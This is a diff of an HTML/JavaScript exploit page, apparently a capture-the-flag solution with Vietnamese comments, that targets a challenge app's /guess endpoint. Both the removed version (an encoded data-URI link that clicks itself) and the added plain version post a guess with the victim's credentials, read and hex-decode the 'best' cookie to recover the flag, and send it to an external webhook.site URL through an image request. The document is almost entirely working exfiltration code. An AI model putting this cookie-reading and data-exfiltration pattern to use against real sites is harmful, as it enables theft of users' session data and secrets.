@@ -1,2 +1,30 @@
-<a download="payload.html" href="data:text/html;charset=utf-8,%3Cscript%3E%3B(async%20()%20%3D%3E%20%7B%0A%20%20await%20fetch('%2Fguess'%2C%20%7B%0A%20%20%20%20method%3A%20'POST'%2C%0A%20%20%20%20credentials%3A%20'include'%2C%0A%20%20%20%20headers%3A%20%7B%20'Content-Type'%3A%20'application%2Fjson'%20%7D%2C%0A%20%20%20%20body%3A%20JSON.stringify(%7B%20guess%3A%20'NHNC%7B'%2C%20note%3A%20''%20%7D)%0A%20%20%7D)%3B%0A%0A%20%20const%20raw%20%3D%20document.cookie.split('%3B%20').find(r%3D%3Er.startsWith('best%3D'))%3B%0A%20%20let%20flag%20%3D%20''%3B%0A%20%20if%20(raw)%20%7B%0A%20%20%20%20const%20val%20%3D%20decodeURIComponent(raw.split('%3D')%5B1%5D)%3B%0A%20%20%20%20const%20%5BhexP%5D%20%3D%20val.split('%3A')%3B%0A%20%20%20%20flag%20%3D%20hexP.match(%2F.%7B1%2C2%7D%2Fg).map(h%3D%3EString.fromCharCode(parseInt(h%2C16))).join('')%3B%0A%20%20%7D%0A%0A%20%20new%20Image().src%20%3D%20'http%3A%2F%2Fwebhook.site%2Fb5ea932e-efd5-4d15-88bc-96f61cc8527a%3Fflag%3D'%20%2B%20encodeURIComponent(flag)%3B%0A%7D)()%3B%3C%2Fscript%3E">click me</a>
-<script>document.querySelector('a').click()</script>
+<!DOCTYPE html>
+<html><body>
+<script>
+;(async () => {
+  // 1) POST /guess để set cookie.best = common_prefix(prefix, guess)
+  await fetch('/guess', {
+    method: 'POST',
+    credentials: 'include',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      guess: 'NHNC{',   // phần bạn đang dò, tăng dần trong loop
+      note: ''         // bạn không cần payload JS ở đây
+    })
+  });
+
+  // 2) Đọc thẳng cookie.best
+  const raw = document.cookie.split('; ').find(r=>r.startsWith('best='));
+  let flag = '';
+  if (raw) {
+    const val = decodeURIComponent(raw.split('=')[1]);
+    // val = hex(prefix) + ':' + hex(note)
+    const [hexP] = val.split(':');
+    flag = hexP.match(/.{1,2}/g).map(h=>String.fromCharCode(parseInt(h,16))).join('');
+  }
+
+  // 3) Exfiltrate ra ngoài
+  new Image().src = 'http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?flag=' + encodeURIComponent(flag);
+})();
+</script>
+</body></html>
